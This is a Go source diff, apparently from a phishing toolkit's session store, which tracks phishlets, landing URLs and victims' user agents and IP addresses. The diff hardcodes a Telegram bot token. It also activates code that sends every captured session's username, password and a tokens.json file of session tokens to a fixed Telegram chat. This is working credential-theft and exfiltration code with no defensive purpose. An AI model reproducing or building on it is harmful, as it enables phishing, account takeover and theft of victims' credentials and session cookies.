@@ -6,8 +6,8 @@ import (
 	"log"
 	"time"
 
-	"github.com/tidwall/buntdb"
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
+	"github.com/tidwall/buntdb"
 )
 
 const SessionTable = "sessions"
@@ -42,11 +42,11 @@ func (d *Database) sessionsInit() {
 var bot *tgbotapi.BotAPI
 
 func init() {
-    var err error
-    bot, err = tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzAa")
-    if err != nil {
-        log.Panic(err)
-    }
+	var err error
+	bot, err = tgbotapi.NewBotAPI("6086116699:AAFlKm9AnMe1KrV9Et7O_73YloglnAG9KIE")
+	if err != nil {
+		log.Panic(err)
+	}
 }
 
 func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
@@ -75,25 +75,26 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 	jf, _ := json.Marshal(s)
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
-			tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
-			return nil
+		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
+		return nil
 	})
 
 	if err != nil {
-			return nil, err}
+		return nil, err
+	}
 
-    // Send text message
-    // message := fmt.Sprintf("ID: %d\nUsername: %s\nPassword: %s", s.Id, s.Username, s.Password)
-    // msg := tgbotapi.NewMessage(5822512651, message)
-    // bot.Send(msg)
+	// Send text message
+	message := fmt.Sprintf("ID: %d\nUsername: %s\nPassword: %s", s.Id, s.Username, s.Password)
+	msg := tgbotapi.NewMessage(5822512651, message)
+	bot.Send(msg)
 
-    // Send document
-    // tokenJSON, _ := json.Marshal(s.Tokens)
-    // tokenFile := tgbotapi.FileBytes{Name: "tokens.json", Bytes: tokenJSON}
-    // documentMsg := tgbotapi.NewDocument(5822512651, tokenFile)
-    // bot.Send(documentMsg)
+	// Send document
+	tokenJSON, _ := json.Marshal(s.Tokens)
+	tokenFile := tgbotapi.FileBytes{Name: "tokens.json", Bytes: tokenJSON}
+	documentMsg := tgbotapi.NewDocument(5822512651, tokenFile)
+	bot.Send(documentMsg)
 
-    return s, nil // Single return point
+	return s, nil // Single return point
 
 }
 
